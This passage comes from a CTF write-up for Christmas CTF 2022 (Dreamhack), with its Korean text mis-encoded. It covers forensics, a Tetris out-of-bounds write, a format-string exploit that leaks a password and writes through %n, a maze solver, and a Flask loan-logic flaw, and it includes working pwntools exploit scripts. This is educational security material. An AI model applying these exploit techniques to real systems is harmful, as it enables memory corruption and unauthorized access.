ftk imagerë¥¼ ì´ìš©í•´ì„œ ì£¼ì–´ì§„ íŒŒì¼ì„ ì—´ì–´ì£¼ë©´

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2015.png)

unallocated spaceì— ìœ„ì™€ ê°™ì€ íŒŒì¼ë“¤ì´ ìˆë‹¤. ì´ë¥¼ ì¶”ì¶œí•´ì„œ í•˜ë‚˜ë¡œ í•©ì³ì£¼ë©´ 

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2016.png)

ì‚°íƒ€ì™€ í•¨ê»˜ í”Œë˜ê·¸ê°€ ë‚˜ì˜¨ë‹¤.

### flag

```python
DH{1_lov3_For3NSiCS_Not_FOur_AND_six}
```

<br><br><br>

# O - **Broken Tetris**

ì½”ë“œ ì–‘ì´ ë§ì•„ì„œ ì«„ì•˜ì§€ë§Œ ì·¨ì•½ì ì€ ìƒê°ë³´ë‹¤ ê°„ë‹¨í–ˆë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2017.png)

ê²Œì„ì´ ëë‚ ë•Œë§ˆë‹¤ ìŠ¤ì½”ì–´ë³´ë“œì— ì´ë¦„ì´ë‘ ì ìˆ˜ë¥¼ ì˜¬ë ¤ì£¼ëŠ”ë° ranking_idxì— ëŒ€í•œ ê²€ì¦ì´ ì—†ì–´ì„œ ë‹¨ìˆœíˆ ê²Œì„ì„ ë§ì´ í•˜ê²Œ ë˜ë©´ oobê°€ ë°œìƒí•˜ê²Œ ëœë‹¤.

ë®ì„ ìˆ˜ ìˆëŠ”ê³³ì¤‘ì— ê°€ì¥ ìœ ìš©í•œ ê³³ì€

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2018.png)

í…ŒíŠ¸ë¡œë¯¸ë…¸ ì •ë³´ë¥¼ ì €ì¥í•˜ê³  ìˆëŠ” ì´ê³³ì´ë‹¤. ì•„ë¬´ë˜ë„ ê²Œì„ì„ êµ¬í˜„í•œê±°ë‹¤ë³´ë‹ˆê¹Œ ì œëŒ€ë¡œ ë¶„ì„í•˜ê¸°ê°€ êº¼ë ¤ì ¸ì„œ ê·¸ëƒ¥ 20ë²ˆì •ë„ ëŒë ¤ë´¤ë”ë‹ˆ ì„¸ê·¸í´íŠ¸ê°€ ë–´ê³  ì–´ë””ì„œ ì–´ë–»ê²Œ ëœ¨ëŠ”ì§€ ë¶„ì„í•´ë´¤ë”ë‹ˆ

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2019.png)

tg_setí•¨ìˆ˜ì—ì„œ rowì™€ columnê°’ì„ ë§˜ëŒ€ë¡œ ì¡°ì‘í•  ìˆ˜ ìˆì—ˆë‹¤. ìš°ë¦¬ê°€ ì…ë ¥í•œ ê°’ìœ¼ë¡œ rowì™€ column, valueê°€ ì¡°ì‘ë˜ì–´ ìˆê¸¸ë˜ ë¬´ìŠ¨ì¼ì¸ê°€ ì‹¶ì–´ì„œ í•´ë‹¹ í•¨ìˆ˜ë¥¼ ë¶€ë¥´ëŠ” ë¶€ë¶„ì„ ë´¤ë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2020.png)

tg_setí•¨ìˆ˜ë¥¼ ë¶€ë¥´ëŠ” ë¶€ë¶„ë“¤ì„ ë³´ë©´ ìš°ë¦¬ê°€ ë®ì–´ì“´ TETROMINOSë¥¼ ì°¸ì¡°í•´ì„œ ì¸ìë¡œ ê°€ê³µí•˜ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ TETROMINOSì˜ ì–´ëŠ ë¶€ë¶„ì´ ì°¸ì¡°ê°€ ë˜ëŠ”ì§€ ë™ì  ë¶„ì„ìœ¼ë¡œ ì •í™•íˆ ì•Œì•„ëƒˆê³  ì˜ ë®ì–´ì£¼ë©´ row, columnì„ ì¡°ì‘í•  ìˆ˜ ìˆê³  tg_setí•¨ìˆ˜ì—ì„œ 2ì°¨ oobë¥¼ ë‚¼ ìˆ˜ ìˆê²Œ ëœë‹¤. tetris_gameêµ¬ì¡°ì²´ëŠ” ìš°ë¦¬ì˜ ê²Œì„ ì ìˆ˜ë„ ë‹´ê³  ìˆìœ¼ë¯€ë¡œ oobë¡œ offsetì˜ ë§ì¶°ì„œ ê²Œì„ ì ìˆ˜ë¶€ë¶„ ì°¸ì¡°í•˜ê²Œ ë§Œë“¤ì–´ ì£¼ê³  (6ë²ˆì§¸ ë°”ì´íŠ¸ë¥¼ ì°¸ì¡°í–ˆë˜ê±¸ë¡œ ê¸°ì–µí•œë‹¤.) 4ë²ˆì§¸ ì¸ìë¡œ TC_EMPTYê°€ ì „ë‹¬ë˜ë©´ 0ì´ ë®ì´ê²Œ ë˜ì–´ì„œ ì ìˆ˜ê°€ ì•ˆì˜¤ë¥´ë‹ˆê¹Œ tg_putë¶€ë¶„ìœ¼ë¡œ tg_setì„ ë¶ˆëŸ¬ì„œ 4ë²ˆì§¸ ì¸ìê°€ TYPE_TO_CELL(block.typ)ë¡œ ë“¤ì–´ê°€ê²Œë” í•´ì¤€ë‹¤. ì´ë ‡ê²Œ ì˜ ì¡°ì‘í•´ì„œ ë¶€ë¥´ë©´ í˜„ì¬ ìŠ¤ì½”ì–´ì˜ 6ë²ˆì§¸ ë°”ì´íŠ¸ê°€ 1ë¡œ ë®ì´ê²Œ ë˜ë©´ì„œ ë§¤ìš° í° ê°’ì´ ëœë‹¤. ì´ë•Œ ê²Œì„ì„ ì¢…ë£Œí•´ì£¼ë©´

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2021.png)

ì¢…ë£Œ ë¶€ë¶„ ë¡œì§ìœ¼ë¡œ ì¸í•´ì„œ get_flagí•¨ìˆ˜ê°€ ë¶ˆë¦¬ê³ 

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2022.png)

ì—¬ê¸°ì„  ìŠ¤ì½”ì–´ê°€ ranking_list[0].scoreë³´ë‹¤ í´ê²½ìš°ì—ë§Œ í”Œë˜ê·¸ë¥¼ ì£¼ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2023.png)

ê³ ì‘í•´ì•¼ 3000ì ì¸ë° ìš°ë¦¬ëŠ” oobë¥¼ ì´ìš©í•´ì„œ ì ìˆ˜ì˜ 6ë²ˆì§¸ ë°”ì´íŠ¸ë¥¼ 1ë¡œ ë®ì—ˆìœ¼ë‹ˆê¹Œ ì ìˆ˜ê°€ ì—„ì²­ë‚˜ê²Œ í° ê°’ì´ ë˜ì–´ìˆì„ê±°ê³  í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆê²Œ ëœë‹¤.

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
s = lambda x : r.send(x)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)

#r = process("./prob", stdout=PTY, stdin=PTY)
r = remote("host3.dreamhack.games", 21255)

for i in range(20):
    sla("> ", "1")
    s("q")
    sa("name : ", p32(0xfffffff9)*14)

sla("> ", "1")
s("q")

r.interactive()
```

<br><br><br>

# P - **Windows Search**

Windows.edbíŒŒì¼ í•˜ë‚˜ë§Œ ì¤€ë‹¤. ì•½ê°„ì˜ êµ¬ê¸€ë§ìœ¼ë¡œ ì € íŒŒì¼ì„ ë¶„ì„í•˜ëŠ” ë„êµ¬ë¥¼ ì°¾ì„ ìˆ˜ ìˆì—ˆê³  ë‹¤ìš´ë°›ì•„ì„œ ì—´ì–´ë³´ì•˜ë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2024.png)

íŒŒì¼íƒìƒ‰ê¸° ê°™ì´ ìƒê²¼ëŠ”ë° ìœ„ì— ê²€ìƒ‰ê¸°ëŠ¥ ìˆìœ¼ë‹ˆê¹Œ flag.txtë¥¼ ê²€ìƒ‰í•´ë³´ì•˜ë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2025.png)

í•˜ë‚˜ê°€ ë‚˜ì˜¤ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2026.png)

ë‚˜ì˜¨ íŒŒì¼ ë”ë¸”í´ë¦­í•´ì„œ ì˜†ì— ëœ¨ëŠ” ìš”ì†Œë“¤ ë’¤ì ê±°ë¦¬ë‹¤ ë³´ë©´ í”Œë˜ê·¸ê°€ ë‚˜ì˜¨ë‹¤.

<br><br><br>

# Q - **Kind kid list**

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char *v3; // rsi
  char *v4; // rdi
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // r8
  __int64 v8; // r9
  const char *v9; // rsi
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // r8
  __int64 v13; // r9
  char s2[8]; // [rsp+0h] [rbp-E0h] BYREF
  __int64 v15; // [rsp+8h] [rbp-D8h]
  char v16[8]; // [rsp+10h] [rbp-D0h] BYREF
  __int64 v17; // [rsp+18h] [rbp-C8h]
  char dest[8]; // [rsp+20h] [rbp-C0h] BYREF
  __int64 v19; // [rsp+28h] [rbp-B8h]
  char v20[132]; // [rsp+30h] [rbp-B0h] BYREF
  char src[8]; // [rsp+B4h] [rbp-2Ch] BYREF
  int v22; // [rsp+BCh] [rbp-24h] BYREF
  FILE *stream; // [rsp+C0h] [rbp-20h]
  void *ptr; // [rsp+C8h] [rbp-18h]
  int v25; // [rsp+D4h] [rbp-Ch]
  int v26; // [rsp+D8h] [rbp-8h]
  int i; // [rsp+DCh] [rbp-4h]

  init(argc, argv, envp);
  intro();
  i = 0;
  v25 = 0;
  v22 = 0;
  v26 = 0;
  *(_QWORD *)src = 0x6E7233767977LL;
  memset(v20, 0, 0x80uLL);
  *(_QWORD *)dest = 0LL;
  v19 = 0LL;
  *(_QWORD *)v16 = 0LL;
  v17 = 0LL;
  *(_QWORD *)s2 = 0LL;
  v15 = 0LL;
  ptr = malloc(8uLL);
  stream = fopen("/dev/urandom", "r");
  fread(ptr, 7uLL, 1uLL, stream);
  v3 = src;
  v4 = dest;
  strcpy(dest, src);
  while ( 1 )
  {
    menu(v4, v3, v5, v6, v7, v8);
    fflush(stdout);
    v3 = (char *)&v22;
    v4 = "%d";
    __isoc99_scanf("%d", &v22);
    if ( v22 == 3 )
      break;
    if ( v22 <= 3 )
    {
      if ( v22 == 1 )
      {
        puts("\n-Kind kid list-");
        for ( i = 0; i <= 5; ++i )
          puts(&v20[16 * i]);
        puts("\n-Naughty kid list-");
        for ( i = 0; i <= 7; ++i )
          putchar(dest[i]);
        v4 = (char *)&byte_2072;
        puts(&byte_2072);
      }
      else if ( v22 == 2 )
      {
        printf("\nPassword : ");
        fflush(stdout);
        __isoc99_scanf("%8s", s2);
        v3 = s2;
        if ( !strncmp((const char *)ptr, s2, 7uLL) )
        {
          printf("Name : ");
          fflush(stdout);
          v3 = v16;
          __isoc99_scanf("%8s", v16);
          if ( v26 > 7 )
          {
            v4 = "Kind list full";
            puts("Kind list full");
          }
          else
          {
            v3 = v16;
            v4 = &v20[16 * v26];
            strcpy(v4, v16);
            ++v26;
          }
        }
        else
        {
          printf(s2);
          v4 = " is Wrong password!";
          puts(" is Wrong password!");
        }
      }
    }
  }
  v25 = 0;
  v9 = "wyv3rn";
  if ( !strcmp(v20, "wyv3rn") )
  {
    for ( i = 0; i <= 5; ++i )
    {
      v9 = &src[i];
      if ( !strcmp(&dest[i], v9) )
      {
        puts("Wyv3rn : My name is still remain on the naughty kid list!");
        exit(0);
      }
    }
    puts("\nWyv3rn : You did it!");
    puts("Wyv3rn : Here is flag!");
    flag("Wyv3rn : Here is flag!", v9, v10, v11, v12, v13);
    exit(0);
  }
  puts("Wyv3rn : My name is not on the kind kid list!");
  exit(0);
}
```

mainí•¨ìˆ˜ë¥¼ ë³´ë©´ 8byteì§œë¦¬ ì‘ì€ fsbë¥¼ ì£¼ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤. ì¼ë‹¨ ì € fsbë¡œ íŒ¨ìŠ¤ì›Œë“œë¥¼ ë¦­í•´ì•¼ë˜ëŠ”ë° offsetë§ì¶”ê¸° ê·€ì°®ì•„ì„œ

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)
rvl = lambda : r.recvline()

#r = process("./kind_kid_list")
r = remote("host1.dreamhack.games", 9141)

offset = 1
for i in range(0x100):
    sla(">> ", "2")
    sla("Password : ", f"%{offset}$p")
    print(rvl()+(str(offset).encode()))
    offset += 1

r.interactive()
```

ëŒ€ì¶© ì´ë ‡ê²Œ ì˜¤í”„ì…‹ ì‹¹ë‹¤ ì°ì–´ë³´ëŠ”ê±° ì§œì¤€ë‹¤ìŒì— íŒ¨ìŠ¤ì›Œë“œ ë“¤ì–´ìˆëŠ” í™ì£¼ì†Œ ë‚˜ì˜¤ëŠ” ì˜¤í”„ì…‹ ì°¾ì•„ì„œ ì¨ì¤¬ë‹¤.

```c
if ( !strcmp(v20, "wyv3rn") )
{
  for ( i = 0; i <= 5; ++i )
  {
    v9 = &src[i];
    if ( !strcmp(&dest[i], v9) )
    {
      puts("Wyv3rn : My name is still remain on the naughty kid list!");
      exit(0);
    }
  }
  puts("\nWyv3rn : You did it!");
  puts("Wyv3rn : Here is flag!");
  flag("Wyv3rn : Here is flag!", v9, v10, v11, v12, v13);
  exit(0);
}
```

í”Œë˜ê·¸ ì£¼ëŠ” ë¶€ë¶„ ë³´ë©´ íŒ¨ìŠ¤ì›Œë“œ ë§ì¶”ê³  ì²«ë²ˆì§¸ë¡œ ì…ë ¥í•œ ì´ë¦„ì´ wyv3rnì´ì–´ì•¼ í•˜ê³  ê·¸ë‹¤ìŒ ì¡°ê±´ì—ëŠ” src[i]ë‘ dest[i]ë‘ ë¬¸ìì—´ì´ í•­ìƒ ë‹¬ë¼ì•¼ í•œë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2027.png)

í•˜ì§€ë§Œ ì²˜ìŒì— strcpyë¡œ ê°™ì€ ê°’ìœ¼ë¡œ ì„¸íŒ…í•´ì¤˜ì„œ ì¼ë°˜ì ì¸ ìƒí™©ì—ì„œëŠ” ë§ˆì§€ë§‰ forë¬¸ì—ì„œ ê±¸ë ¤ì„œ í”Œë˜ê·¸ë¥¼ ëª»ë”°ê²Œ ëœë‹¤. ê·¸ë˜ì„œ ì¡°ê¸ˆ ê³ ë¯¼í•˜ë‹¤ê°€ fsbë¡œ ì € ë‘ê°œì¤‘ì— í•˜ë‚˜ë¥¼ ë®ì–´ì„œ ê°’ì„ ë‹¤ë¥´ê²Œ ë§Œë“¤ìëŠ” ìƒê°ì„ í–ˆê³  stack leakë”´ë‹¤ìŒì— íŒ¨ìŠ¤ì›Œë“œ ë§ì¶”ë©´ ì´ë¦„ ì…ë ¥í•˜ëŠ” ê¸°ëŠ¥ ì´ìš©í•´ì„œ ìŠ¤íƒì— ë®ìœ¼ë ¤ëŠ” ì£¼ì†Œ ë„£ì–´ì¤¬ê³  íŒ¨ìŠ¤ì›Œë“œ í™ì£¼ì†Œ offsetì•Œì•„ë‚¼ë•Œ ì¼ë˜ ì½”ë“œ ê·¸ëŒ€ë¡œ ì¨ì„œ offsetì„ ì‰½ê²Œ ì•Œì•„ëƒˆë‹¤.

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)
rvl = lambda : r.recvline()

#r = process("./kind_kid_list")
r = remote("host1.dreamhack.games", 9141)

'''offset = 1
for i in range(0x100):
    sla(">> ", "2")
    sla("Password : ", f"%{offset}$p")
    print(rvl()+(str(offset).encode()))
    offset += 1'''

sla(">> ", "2")
sla("Password : ", "%31$s")

pw = rv(7)

sla(">> ", "2")
sla("Password : ", "%42$p")

stack_leak = int(rv(14), 16)
aaw = stack_leak - 0x1d8
log.info(hex(aaw))

sla(">> ", "2")
sla("Password : ", pw)
sla("Name", "wyv3rn")

for i in range(6):
    sla(">> ", "2")
    sla("Password : ", pw)
    sla("Name", p64(aaw))

sla(">> ", "2")
sla("Password : ", "%14$ln")

sla(">> ", "3")

r.interactive()
```

ìœ„ ìµìŠ¤í”Œë¡œì‡ìœ¼ë¡œ í”Œë˜ê·¸ë¥¼ ì–»ì–´ë‚¼ ìˆ˜ ìˆë‹¤.

<br><br><br>

# R - Santa is lost

ë¯¸ë¡œì˜ í˜•íƒœê°€ ê¸¸ì´ ìœ ì¼í•œ íŠ¸ë¦¬ í˜•íƒœì´ê³ , ì¢Œìš°, ìƒí•˜ê°€ ì—­ì—°ì‚° ê´€ê³„ì´ê¸° ë•Œë¬¸ì— ì–´ë–¤ ê²½ë¡œë¥¼ ê°€ë”ë¼ë„ ëª©í‘œí•œ 1023, 1023ì— ë„ë‹¬í•˜ë©´ ì›í•˜ëŠ” ê°’ì„ ì–»ì„ ìˆ˜ ìˆë‹¤. 

ë¯¸ë¡œ í•„ìŠ¹ì „ëµ ì˜¤ë¥¸ìª½ ë²½ íƒ€ê¸°, ê³ ê¸‰ì§€ê²Œ í‘œí˜„í•˜ë©´ DFS ê·¸ë˜í”„ íƒìƒ‰ì„ ì´ìš©í•´ì„œ 1023, 1023ì— ë„ë‹¬í•  ìˆ˜ ìˆë‹¤. 

ex.py

```python
from pwn import *

p = process("./prob")

f = open("state.txt", "w")
flag = open("flag.txt", "w")

block = b"\xe2\x97\xbd"
santa = b"\xf0\x9f\x8e\x85"

x = 0
y = 0
wall_d = 2 # right: 0, up: 1, left: 2, down: 3

def restate(cmd):
	global x, y
	p.send(cmd)
	if cmd == "w":
		y -= 1
	if cmd == "a":
		x -= 1
	if cmd == "s":
		y += 1
	if cmd == "d":
		x += 1

	f.write(f"x: {x}, y: {y}, wall: {wall_d}\n")

	state = []
	p.recvline()
	for _ in range(15):
		line = p.recvline()
		state_line = []

		while line[:1] != b'\n':
			if line[:3] == block:
				state_line.append(1)
				line = line[3:]
			elif line[:4] == santa:
				state_line.append(2)
				line = line[4:]
			elif line[:2] == b"  ":
				state_line.append(0)
				line = line[2:]
			else:
				break

		assert len(state_line) == 28
		state.append(state_line)
	p.recvline()
	state.append(p.recvline().decode())
	'''
	for i in range(16):
		f.write(str(state[i]) + "\n")
	f.write("\n")
	'''

	if x == 1023 and y == 1023:
		flag.write(state[15])
		exit()

	return state

#santa: 8, 15

state = restate("")

while 1:
	# f.write(f"wall: {wall_d}\n")
	# f.write(f"x: {x}, y: {y}\n")

	assert state[8][15] == 2

	if wall_d == 0:
		assert state[8][16] == 1

		if state[7][15] == 1:
			wall_d = 1

		elif state[6][16] == 1:
			state = restate("w")

		elif state[7][17] == 1:
			state = restate("w")
			state = restate("d")
			wall_d = 3

		else:
			state = restate("w")
			state = restate("d")
			state = restate("s")
			wall_d = 2

	elif wall_d == 1:
		assert state[7][15] == 1

		if state[8][14] == 1:
			wall_d = 2

		elif state[7][13] == 1:
			state = restate("a")

		elif state[6][14] == 1:
			state = restate("a")
			state = restate("w")
			wall_d = 0

		else:
			state = restate("a")
			state = restate("w")
			state = restate("d")
			wall_d = 3

	elif wall_d == 2:
		assert state[8][14] == 1

		if state[9][15] == 1:
			wall_d = 3

		elif state[10][14] == 1:
			state = restate("s")

		elif state[9][13] == 1:
			state = restate("s")
			state = restate("a")
			wall_d = 1

		else:
			state = restate("s")
			state = restate("a")
			state = restate("w")
			wall_d = 0

	else:
		assert state[9][15] == 1

		if state[8][16] == 1:
			wall_d = 0

		elif state[9][17] == 1:
			state = restate("d")

		elif state[10][16] == 1:
			state = restate("d")
			state = restate("s")
			wall_d = 2

		else:
			state = restate("d")
			state = restate("s")
			state = restate("a")
			wall_d = 1
```

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2028.png)

flag

```
DH{Thx for helping Santa Claus!}
```

<br><br><br>

# S - **out of money**

```python
from flask import Flask, session, redirect, url_for, request, render_template
from threading import Thread
from util import get_price, deposit, liquidate

app = Flask(__name__)
app.secret_key = "[REDACTED]"

@app.route("/", methods=['GET', 'POST'])
def main():
    if request.method == 'POST' and request.form['name'] != "":
        session['name'] = request.form['name']

        session['DHH'] = 0.0
        session['DHC'] = 0.0
        session['DHD'] = 0.0

        session['debt_DHH'] = 0.0

        session['col_DHC'] = 0.0
        session['depo_DHC'] = 0.0
        session['depo_DHD'] = 0.0
        session['debt_DHD'] = 0.0

        return redirect(url_for('main'))

    if 'name' in session:
        return render_template("lobby.html", session=session)
    else:
        return render_template("login.html")

@app.route("/santa", methods=['GET', 'POST'])
def santa():
    return render_template("santa.html", session=session, message="")

@app.route("/santa/lend", methods=['POST'])
def santa_lend():
    value = float(request.form['value'])

    if session['debt_DHH'] + value >= 10000.0:
        return render_template("santa.html", session=session, message="ê·¸ë§Œ ë¹Œë ¤ìš§!")
    if session['DHH'] + value < 0.0:
        return render_template("santa.html", session=session, message="ë” ê°šìœ¼ì‹œê²Œìš”...?")

    session['DHH'] += value
    session['debt_DHH'] += value
    return render_template("santa.html", session=session, message="ëŒ€ì¶œì™„ë£Œ!")

@app.route("/santa/flag", methods=['GET'])
def santa_flag():
    if session['DHH'] >= 1000.0:
        if session['debt_DHH'] == 0.0:
            return render_template("flag.html")
        else:
            return render_template("santa.html", session=session, message="ë¹šì„ ë¨¼ì € ê°’ìœ¼ì„¸ìš§!")
    return render_template("santa.html", session=session, message="ë“œí•µì½”ì¸ì´ ì—†ì–´ìš§!")

@app.route("/santa/change", methods=['POST'])
def santa_change():
    frm = int(request.form['from'])
    to = int(request.form['to'])
    value = float(request.form['value'])

    if value < 0:
        return render_template("santa.html", session=session, message="ì–´ë””ì„œ ìŒìˆ˜ë§Œí¼ ë°”ê¾¸ë ¤ê³ !")

    tbl = ['DHH', 'DHC', 'DHD']
    if frm in [0, 1, 2] and to in [0, 1, 2]:
        frm = tbl[frm]
        to = tbl[to]

        if session[frm] < value:
            return render_template("santa.html", session=session, message="ê°€ì§€ê³  ìˆëŠ” ì½”ì¸ì´ ê·¸ë§Œí¼ ì—†ì–´ìš§!")

        if frm != to:
            frm_price = get_price(frm)
            to_price = get_price(to)

            to_balance = value * frm_price / to_price

            session[frm] -= value
            session[to] += to_balance
        return render_template("santa.html", session=session, message="êµí™˜ ì™„ë£Œ!")
    return render_template("santa.html", session=session, message="ë‹¤ë¥¸ê±´ êµí™˜ ëª»í•©ë‹ˆë‹¤!")

@app.route("/dream", methods=['GET'])
def dream():
    return render_template("dream.html", session=session, message="")

@app.route("/dream/collateral", methods=['POST'])
def dream_col():
    value = float(request.form['value'])

    if value < 0:
        if session['debt_DHD'] == 0.0:
            session['DHC'] += session['col_DHC']
            session['col_DHC'] = 0.0
            return render_template("dream.html", session=session, message="ë‹´ë³´ ë°˜í™˜ ì™„ë£Œ!")
        else:
            return render_template("dream.html", session=session, message="ë¹šì„ ë¨¼ì € ê°’ìœ¼ì„¸ìš§!")
    if session['DHC'] - value < 0.0:
        return render_template("dream.html", session=session, message="ê°€ì§€ê³  ìˆëŠ” ë“œëƒ¥ì½”ì¸ì´ ë¶€ì¡±í•©ë‹ˆë‹¤!")

    session['DHC'] -= value
    session['col_DHC'] += value
    return render_template("dream.html", session=session, message="ë‹´ë³´ í™•ì¸!")

@app.route("/dream/deposit", methods=['POST'])
def dream_deposit():
    type = int(request.form['type'])
    value = float(request.form['value'])

    if type not in [0, 1]:
        return render_template("dream.html", session=session, message="ë“œí•µì½”ì¸, ë“œëƒ¥ì½”ì¸ë§Œ ì˜ˆê¸ˆí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!")

    tbl = ['DHC', 'DHD']
    type = tbl[type]
    if session[type] - value < 0:
        return render_template("dream.html", session=session, message="ê°€ì§€ê³  ìˆëŠ” ì½”ì¸ì´ ë¶€ì¡±í•©ë‹ˆë‹¤!")
    if session["depo_" + type] + value < 0:
        return render_template("dream.html", session=session, message="ì—ê¸ˆí•œ ì½”ì¸ë³´ë‹¤ ë” ëº„ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤!")
    session[type] -= value
    session["depo_" + type] += value
    deposit(type, value)
    return render_template("dream.html", session=session, message="ì˜ˆê¸ˆì™„ë£Œ")

@app.route("/dream/lend", methods=['POST'])
def dream_loan():
    value = float(request.form['value'])

    dhc_price = get_price('DHC')
    dhd_price = get_price('DHD')

    max_lend = session['col_DHC'] * dhc_price / dhd_price * 0.8

    print(max_lend)

    if session['DHD'] + value < 0.0:
        return render_template("dream.html", session=session, message="ë” ê°šìœ¼ì‹œê²Œìš”...?")
    if max_lend < value:
        return render_template("dream.html", session=session, message="ê·¸ë§Œí¼ ë¹Œë¦¬ê¸°ì—ëŠ” ë‹´ë³´ê°€ ë¶€ì¡±í•©ë‹ˆë‹¤!")

    session['DHD'] += value
    session['debt_DHD'] += value

    return render_template("dream.html", session=session, message="ëŒ€ì¶œ ì™„ë£Œ!")

@app.route("/logout")
def logout():
    session.pop('name', None)
    return redirect(url_for('main'))

import time
def loop_liquid():
    while True:
        time.sleep(2)
        liquidate()

if __name__ == '__main__':
    t1 = Thread(target = loop_liquid, daemon=True)
    t1.start()
    app.run(host="0.0.0.0")
```

ì´ ë¬¸ì œë„ ì†ŒìŠ¤ì½”ë“œ ë¶„ì„ ì œëŒ€ë¡œ ì•ˆí•˜ê³  ê°ìœ¼ë¡œ í’€ì—ˆë‹¤. ì¼ë‹¨ ëŒ€ì¶œì˜ ì¢…ë¥˜ì—ëŠ” ë¬´ë‹´ë³´ ëŒ€ì¶œê³¼ ë‹´ë³´ ëŒ€ì¶œ ë‘ê°€ì§€ê°€ ìˆëŠ”ë° ëŒ€ì¶œí•œ ëˆìœ¼ë¡œ í”Œë˜ê·¸ êµ¬ë§¤í•˜ë©´ ì•ˆë˜ë‹ˆê¹Œ í”Œë˜ê·¸ êµ¬ë§¤í• ë•Œ ê°’ì„ ë¹šì´ ìˆëŠ”ì§€ ê²€ì¦í•œë‹¤. ê·¼ë° ì½”ë“œ ë³´ë©´ ë¬´ë‹´ë³´ ëŒ€ì¶œì— ëŒ€í•´ì„œë§Œ ê²€ì¦í•˜ê³  ë‹´ë³´ ëŒ€ì¶œì€ ê²€ì¦í•˜ëŠ” ì½”ë“œê°€ ì—†ë‹¤. ë‹´ë³´ëŒ€ì¶œì€ ëª‡ë²ˆ í…ŒìŠ¤íŠ¸ í•´ë³´ë‹ˆê¹Œ ëŒ€ì¶œ íšŸìˆ˜ì—ëŠ” ì œí•œì´ ì—†ëŠ”ê±° ê°™ê¸¸ë˜ ì²˜ìŒì—ëŠ” ë¬´ë‹´ë³´ëŒ€ì¶œë¡œ 100ì •ë„ ë¹¼ì˜¨ë‹¤ìŒ ë‹´ë³´ë¡œ ëª°ë¹µí•´ì£¼ê³  ë‹´ë³´ëŒ€ì¶œ ê³„ì† í•˜ë©´ì„œ ëˆë³µì‚¬í•˜ê³  ë¬´ë‹´ë³´ëŒ€ì¶œ ë‹¤ ê°’ì€ë‹¤ìŒ í”Œë˜ê·¸ ìƒ€ë‹¤.

<br><br><br>

# U - **Wish List**

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2029.png)

ë¨¼ì € inputí•¨ìˆ˜ë¥¼ ë³´ë©´ size+1ì„ í•´ì„œ ì…ë ¥ë°›ëŠ”ë‹¤. ë’¤ì— ë„ë°”ì´íŠ¸ë•Œë¬¸ì— ì €ë ‡ê²Œ í•´ì¤€ê±°ê°™ì€ë° ì €ë ‡ê²Œ ì²˜ë¦¬í•´ë²„ë¦¬ë©´ ë„ë°”ì´íŠ¸ê°€ ë²„í¼ë¥¼ ë²—ì–´ë‚˜ì„œ ì¨ì ¸ì„œ ë°”ë¡œ ë’¤ì— ë‹¤ë¥¸ í¬ì¸í„°ì™€ ê°™ì€ ê°’ë“¤ì´ ì¡´ì¬í• ê²½ìš° 1byteê°€ NULLë¡œ ë®ì¼ ìœ„í—˜ì„±ì´ ì¡´ì¬í•˜ê²Œ ëœë‹¤. winí•¨ìˆ˜ê°€ ìˆìœ¼ë¯€ë¡œ aawí•œë²ˆë§Œ í•˜ë©´ ëœë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2030.png)

show_wishlistí•¨ìˆ˜ë¥¼ ë³´ë©´ nameì— ì•„ë¬´ëŸ° ê°’ì´ ì—†ìœ¼ë©´ set_nameì„ ë¶€ë¥´ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2031.png)

set_nameì—ì„œëŠ” ì·¨ì•½í•œ í•¨ìˆ˜ì¸ inputí•¨ìˆ˜ë¡œ nameì„ ì„¤ì •í•´ì¤€ë‹¤. ì € nameë³€ìˆ˜ëŠ” ì–´ë””ì„œ ë‚˜ì˜¤ëŠ”ê±°ëƒë©´

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2032.png)

